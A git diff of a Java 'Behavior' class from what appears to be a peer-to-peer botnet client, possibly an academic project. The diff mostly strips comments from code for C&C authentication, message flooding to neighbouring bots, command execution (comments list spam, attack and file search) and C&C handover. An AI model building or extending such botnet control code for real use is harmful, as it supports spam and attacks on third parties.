@@ -77,12 +77,10 @@ public class Behavior {
 	 * 
 	 */
 	public void initializeBot() {
-		// nServ.firstConnectToMockServerDns();
 		if (challengeToCommandConquer()) {
 			System.out.println("Bot Autenticazione riuscita");
 		} else
 			System.out.println("Bot Autenticazione fallita");
-		// System.out.println("Bot not Ready, authentication failed");
 
 		String data = nServ.getIdHash();
 		SyncIpList<IP, PublicKey> ips = nServ.getCommandConquerIps();
@@ -145,36 +143,7 @@ public class Behavior {
 		return false;
 	}
 
-	// verify bot
 
-	// verify msgbyCec
-
-	// asynch thread
-	// decript msg
-
-	// send to neighbourhood
-
-	// execute
-
-	// answer yes
-
-	// else answer no
-
-	// /**
-	// * Convert a String with format red|green|blue|alpha
-	// * to a Color object
-	// */
-	// @Override
-	// public Color convertToEntityAttribute(String colorString) {
-	// String[] rgb = colorString.split(SEPARATOR);
-	// return new Color(Integer.parseInt(rgb[0]),
-	// Integer.parseInt(rgb[1]),
-	// Integer.parseInt(rgb[2]),
-	// Integer.parseInt(rgb[3]));
-	// }
-
-	
-	
 	//<HH> sono i separatori
 	// IDMSG|COMANDO|SIGNATURE(IDMSG)
 
@@ -249,12 +218,6 @@ public class Behavior {
 			}
 		}
 
-		// nServ.getNeighbours().getList().forEach((pairs) -> {
-		// System.out.println("pairs ip"+pairs.getValue1().getIp());
-		// req.sendFloodToOtherBot(pairs.getValue1(), msg);
-		// });
-
-		// cripta il messaggio e invialo ai vicini
 
 	}
 
@@ -296,14 +259,6 @@ public class Behavior {
 			if(nServ.getIdUser().equals(idUser))
 				nServ.setIdUser("");
 		}
-
-		// che comando è?
-		// spam
-		// attack
-		// search file
-		// Mail
-		// Update vicinato
-		//
 		System.out.println("COMANDO ESEGUTO");
 	}
 
@@ -312,8 +267,6 @@ public class Behavior {
 		nServ.getCommandConquerIps().remove(0);
 		Pairs<IP, PublicKey> pairs = new Pairs<IP, PublicKey>(new IP(msgs[1]), pki.rebuildPuK(msgs[2]));
 		nServ.getCommandConquerIps().add(pairs);
-		// Svuota lista sg (verrano riiutati in automatico in quanto fimrati con
-		// chiave vecchia)
 		System.out.println("C&C AGGIORNATO");
 
 	}
@@ -445,17 +398,7 @@ public class Behavior {
 			}
 		}
 
-		// return true;
 	}
-
-	// class RolesComp implements Comparator<Role>{
-	//
-	// @Override
-	// public int compare(Role a, Role b ){
-	// if(a.getId()>b.getId())
-	// return 1
-	// }
-	// }
 
 	/**
 	 * @param ip
@@ -526,10 +469,6 @@ public class Behavior {
 		if ((b != null) && (b)) {
 			System.out.println("SONO IL NUOVO C&C");
 			eng.setCommandandconquerStatus(true);
-			// nServ.getCommandConquerIps().remove(0); non lo faccio più perché
-			// mi aggiorno con il flood del cec
-			// nServ.getCommandConquerIps().add(new Pairs<IP, PublicKey>(
-			// nServ.getMyIp(), pki.getPubRSAKey()));
 			pServ.setNewKing("");
 		}
 		// controllare risposta da cec che ha avvisato dns
